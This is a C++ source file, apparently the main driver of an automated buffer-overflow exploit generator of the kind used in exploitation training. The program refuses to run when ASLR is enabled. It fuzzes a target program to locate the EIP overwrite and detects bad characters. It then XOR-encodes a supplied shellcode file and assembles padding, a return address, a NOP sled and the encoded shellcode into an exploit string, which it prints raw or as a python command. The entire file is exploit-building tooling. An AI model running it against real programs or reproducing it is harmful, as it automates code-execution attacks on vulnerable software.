#include <iostream>
#include <string>
#include "Log/Log.hpp"
#include "Utility/Filesystem/File.hpp"
#include "Encoder/XorEncoder.hpp"
#include "Stages/Fuzzer/Fuzzer.hpp"
#include "Stages/BadCharacters/BadCharacters.hpp"

void printHelp(char* application)
{
    std::cerr << application << " [verbose|exploit] payload-file application-file" << std::endl;
}

int main(int argc, char* argv[])
{
    // Show help message
    if (argc < 4)
    {
        printHelp(argv[0]);
        return 1;
    }

    std::string mode = std::string(argv[1]);
    if (mode == "verbose")
        Log::mode = LogMode::Verbose;
    else if (mode == "exploit")
        Log::mode = LogMode::Exploit;
    else
    {
        printHelp(argv[0]);
        return 2;
    }

    std::string application = std::string(argv[3]);

    // Ensure ASLR is disabled
    if (Application::isAslrEnabled())
    {
        Log::error("ASLR is enabled but not supported by this application.\n");
        return 3;
    }

    // Read payload
    size_t rawPayloadSize = 0;
    uint8_t* rawayload = File::readAllBytes(std::string(argv[2]), &rawPayloadSize);
    if (rawayload == nullptr)
    {
        Log::error("Failed to read the payload file.\n");
        return 4;
    }

    // Run the fuzzer to find EIP
    if (!Fuzzer::run(application))
        return 5;

    // Find bad characters
    if (!BadCharacters::run(application))
        return 5;

    // Encode shell
    Log::info("XOR encoding payload...\n");
    std::string shell = XorEncoder::encode(rawayload, rawPayloadSize, Application::badCharacters.data(), Application::badCharacters.size());

    // Free raw payload
    free(rawayload);
    rawayload = nullptr;

    // Build payload
    Payload* payloadBuilder = Payload::builder()
        ->padding()
        ->eip()
        ->nopSled()
        ->append(shell);
    std::string payload = payloadBuilder->get();
    delete payloadBuilder;

    // Output python command
    if (Log::mode == LogMode::Verbose)
    {
        std::string python = "";
        for (uint32_t i = 0; i < payload.length(); i++)
        {
            char buffer[5];
            sprintf(buffer, "\\x%02x", (uint8_t)(payload[i]));
            python += std::string(buffer);
        }
        Log::success("[%i bytes] python -c 'print(\"%s\")'\n", payload.length(), python.c_str());
    }

    Log::exploit("%s", payload.c_str());
    return 0;
}
